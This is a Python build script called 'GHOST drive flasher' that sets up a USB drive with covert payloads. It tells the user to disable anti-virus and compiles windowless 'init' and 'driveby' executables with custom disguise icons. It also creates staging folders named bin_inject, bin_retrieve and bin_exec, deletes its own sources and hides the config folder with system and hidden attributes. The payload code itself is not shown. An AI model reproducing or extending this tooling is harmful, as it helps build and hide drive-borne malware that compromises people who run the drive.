import os, subprocess, shutil
from termcolor import colored
print(colored("\nGHOST drive flasher", "green", attrs=['underline']))
print(colored("\nNOTE: briefly disable your anti-virus/anti-malware service while flashing", "blue")+"\n\n")

try:
	subprocess.Popen("pyinstaller", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except FileNotFoundError:
	print(colored("FATAL ERROR: pyinstaller not installed or misconfigured", "red"))


path_x = 1
while path_x:
	path = input("Flash path: ")
	if os.path.isdir(path.rstrip().replace('"', '')):
		path = path.rstrip().replace('"', '')
		if os.path.exists(path+"\\config"):
			print(colored("ERROR: interference detected in the specified path", "red")+"\n")
		else:
			path_x = 0
	else:
		print(colored("ERROR: path invalid", "red")+"\n")

init_icon_x = 1
while init_icon_x:
	init_icon = input("Initializer icon path: ")
	if os.path.exists(init_icon):
		if not init_icon.lower().rstrip().replace('"', '').endswith(".ico"):
			print(colored("ERROR: file is not an icon file", "red")+"\n")
		else:
			init_icon = init_icon.rstrip().replace('"', '')
			init_icon_x = 0
	else:
		print(colored("ERROR: path invalid", "red")+"\n")

driveby_icon_x = 1
while driveby_icon_x:
	driveby_icon = input("Driveby icon path: ")
	if os.path.exists(driveby_icon):
		if not driveby_icon.lower().rstrip().replace('"', '').endswith(".ico"):
			print(colored("ERROR: file is not an icon file", "red")+"\n")
		else:
			driveby_icon = driveby_icon.rstrip().replace('"', '')
			driveby_icon_x = 0
	else:
		print(colored("ERROR: path is invalid", "red")+"\n")


folder = path+"\\"+"config"
os.chdir("../")
os.makedirs(folder)
subprocess.call(["cmd", "/c", "robocopy", "config", folder, "/s", "/e"])
os.system("copy init.py "+"\""+path+"\"")
os.chdir(path)
subprocess.call(["pyinstaller", "init.py", "-F", "-w", "-i", init_icon])
os.chdir("dist")
os.system("cmd /c copy init.exe \"../\"")
os.chdir("../")
os.system("rd /s /q __pycache__ build dist")
os.system("del init.spec init.py")
os.chdir("config")
subprocess.call(["pyinstaller", "driveby.py", "-F", "-w", "-i", driveby_icon])
os.chdir("dist")
os.system("copy driveby.exe \"../\"")
os.chdir("../")
os.system("rd /s /q __pycache__ build dist")
os.system("del driveby.spec driveby.py flash.py compiler.bat")
if not os.path.exists("hosts"):
	os.makedirs("hosts")
if not os.path.exists('stub'):
	os.makedirs('stub')
os.chdir("ext")
if not os.path.exists("bin_retrieve"):
	os.makedirs("bin_retrieve")
if not os.path.exists("bin_inject"):
	os.makedirs("bin_inject")
if not os.path.exists('bin_exec'):
	os.makedirs('bin_exec')

os.chdir("../../")
os.system("attrib +s +h config")
print(colored("\n\nGHOST drive has been successfully flashed", "green"))